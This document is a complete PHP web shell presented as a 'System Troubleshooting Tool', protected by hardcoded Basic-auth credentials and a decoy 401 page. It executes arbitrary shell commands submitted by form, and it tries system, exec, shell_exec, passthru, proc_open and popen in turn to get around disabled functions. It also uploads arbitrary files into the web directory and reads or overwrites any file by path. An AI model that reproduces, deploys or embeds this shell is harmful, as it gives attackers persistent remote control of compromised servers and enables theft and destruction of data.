<?php
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '-1');
$username = 'zelda';
$password = 'r00t';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_USER'] != $username || $_SERVER['PHP_AUTH_PW'] != $password) {
    header('WWW-Authenticate: Basic realm="2FA"');
    header('HTTP/1.0 401 Unauthorized');
    http_response_code(401);
    echo '<!DOCTYPE html><html><head><title>401 Unauthorized</title></head><body><h1>Authentication required</h1></hr><p>You do not have permission to access this resource.</p> <p>Please check your credentials or <a href="/">return to the homepage</a>.</p></body></html>';
    exit;
}

$cmd = $_POST['cmd'] ?? '';
$method = '';
$output = '';
$uploadMsg = '';
// Execute command with fallback
if ($cmd) {
    $functions = [
        'system' => function($c) { ob_start(); system($c . ' 2>&1'); return ob_get_clean(); },
        'exec' => function($c) { $tmp = []; exec($c . ' 2>&1', $tmp); return implode("\n", $tmp); },
        'shell_exec' => function($c) { return shell_exec($c . ' 2>&1'); },
        'passthru' => function($c) { ob_start(); passthru($c . ' 2>&1'); return ob_get_clean(); },
        'proc_open' => function($c) {
            $process = proc_open($c . ' 2>&1', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
            if (is_resource($process)) { $out = stream_get_contents($pipes[1]); proc_close($process); return $out; }
            return '';
        },
        'popen' => function($c) { $fp = popen($c . ' 2>&1', 'r'); $out = stream_get_contents($fp); pclose($fp); return $out; }
        //,'backticks' => function($c) { return `$c 2>&1`; }
    ];

    foreach ($functions as $name => $func) {
        if (function_exists($name) && !in_array($name, explode(',', ini_get('disable_functions')))) {
            $output = $func($cmd);
            $method = strtoupper($name);
            break;
        }
    }
}
// Handle file upload
if (isset($_POST['upload'])) {
    $target_dir = "./";
    $target_file = $target_dir . basename($_FILES["uploaded_file"]["name"]);
    if (move_uploaded_file($_FILES["uploaded_file"]["tmp_name"], $target_file)) {
        $uploadMsg = "<br>File uploaded successfully: " . htmlspecialchars(basename($_FILES["uploaded_file"]["name"]));
    } else {
        $uploadMsg = "<br>Error uploading file.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Troubleshooting Tool</title>
    <style>
        :root {
            --primary: #007bff;
            --danger: #dc3545;
            --bg: #f8f9fa;
            --text: #333;
        }
        body {
            font-family: Arial, sans-serif;
            background: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #fff;
            padding: 20px;
            border-radius: 4px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 { color: var(--primary); }
        .alert {
            padding: 10px;
            border-radius: 4px;
            margin: 10px 0;
        }
        .alert-warning {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeeba;
        }
        input[type="text"] {
            width: 80%;
            padding: 8px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        input[type="submit"] {
            background: var(--primary);
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        pre {
            background: #333;
            color: #fff;
            padding: 10px;
            border-radius: 4px;
            overflow: auto;
        }

.file-editor-container {
    background: #fff;
    padding: 20px;
    border-radius: 4px;
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
    font-family: Arial, sans-serif;
    color: #333;
    max-width: 800px;
    margin: 20px auto;
}

.file-editor-container label {
    font-weight: bold;
    display: block;
    margin-bottom: 5px;
    color: #007bff;
}

.file-editor-container input[type="text"] {
    width: 70%;
    padding: 8px;
    margin-right: 10px;
    border: 1px solid #ddd;
    border-radius: 4px;
    font-size: 14px;
}

.file-editor-container textarea {
    width: 100%;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 4px;
    font-family: monospace;
    font-size: 14px;
    background: #f8f9fa;
    box-sizing: border-box;
    resize: vertical;
}

.file-editor-container button {
    padding: 8px 16px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 14px;
    margin-right: 5px;
    color: #fff;
    transition: opacity 0.2s;
}

.file-editor-container button:hover {
    opacity: 0.9;
}

.file-editor-container button[value="edit"],
.file-editor-container button[value="save"] {
    background: #007bff; /* Primary */
}

.file-editor-container button[value="cancel"] {
    background: #6c757d; /* Secondary/Gray */
}

.file-editor-container p {
    padding: 10px;
    border-radius: 4px;
    margin: 10px 0;
    border: 1px solid transparent;
}

.file-editor-container p span[style*="red"] {
    color: #856404;
    background: #fff3cd;
    border-color: #ffeeba;
    padding: 5px 10px;
    border-radius: 4px;
}

.file-editor-container p span[style*="green"] {
    color: #155724;
    background: #d4edda;
    border-color: #c3e6cb;
    padding: 5px 10px;
    border-radius: 4px;
}

.file-editor-container p span[style*="blue"] {
    color: #0c5460;
    background: #d1ecf1;
    border-color: #bee5eb;
    padding: 5px 10px;
    border-radius: 4px;
}   
    </style>
</head>
<body>
    <div class="container">
        <h1>System Troubleshooting Tool</h1>
        <div class="alert alert-warning">
            <strong>Warning:</strong> This tool is for authorized use only.
        </div>
        <form method='post' enctype='multipart/form-data'>
            <input type='file' name='uploaded_file' />
            <br><br>
            <input type='submit' name='upload' value='Upload File' />
        </form>
        <br><hr><br>
        <form method='post'>
            <input type='text' name='cmd' placeholder='Enter command' />
            <input type='submit' value='Execute' />
        </form>
        <?php
        if ($output !== '') {
            echo "<pre><strong>Executed with: $method</strong>\n" . htmlspecialchars($output) . "</pre>";
        }
        echo $uploadMsg;
        ?>
    </div>
<div class="file-editor-container">
    <?php
    $file_path = '';
    $content = '';
    $mode = 'select'; // Default to 'select' (input only)
    $message = '';

    if (isset($_POST['action']) && $_POST['action'] === 'edit' && !empty($_POST['file_path'])) {
        $file_path = $_POST['file_path'];
        if (file_exists($file_path)) {
            $content = file_get_contents($file_path);
            $mode = 'edit';
        } else {
            $message = "<span style='color:red;'>File not found.</span>";
            $mode = 'select'; // Stay on select screen
        }
    }

    if (isset($_POST['action']) && $_POST['action'] === 'save' && !empty($_POST['file_path'])) {
        $file_path = $_POST['file_path'];
        // Save the content
        file_put_contents($file_path, $_POST['content']);
        $message = "<span style='color:green;'>File saved successfully.</span>";
        unset($file_path, $content); 
        $mode = 'select'; 
    }

    if (isset($_POST['action']) && $_POST['action'] === 'cancel') {
        $message = "<span style='color:blue;'>Edit cancelled.</span>";
        unset($file_path, $content);
        $mode = 'select';
    }
    ?>

    <?php if ($message): ?>
        <p><?php echo $message; ?></p>
    <?php endif; ?>

    <form method="POST">
        <?php if ($mode === 'select'): ?>
           
            <label for="file_path">File Path:</label>
            <input type="text" name="file_path" id="file_path" value="<?php echo isset($_POST['file_path']) ? htmlspecialchars($_POST['file_path']) : ''; ?>" required>
            <button type="submit" name="action" value="edit">Edit</button>
        
        <?php elseif ($mode === 'edit'): ?>
            
            <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($file_path); ?>">
            
            <textarea name="content" rows="10" cols="50" style="width: 100%;"><?php echo htmlspecialchars($content); ?></textarea>
            <br><br>
            
            <button type="submit" name="action" value="save">Save</button>
            <button type="submit" name="action" value="cancel">Cancel</button>
        <?php endif; ?>
    </form>
</div>
</body>
</html>   